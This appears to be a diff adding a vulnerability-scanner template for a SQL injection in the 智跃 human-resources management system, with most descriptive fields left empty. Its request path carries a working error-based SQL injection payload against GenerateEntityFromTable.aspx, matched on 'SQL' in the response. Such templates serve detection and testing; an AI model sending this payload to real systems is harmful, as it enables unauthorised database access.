@@ -1,0 +1,16 @@
+id:
+info:
+  name: 智跃人力资源管理系统 SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+@@version))%2B%27
+response1:
+  headers:
+  body: SQL
+  code:
+requests2:
+response2:
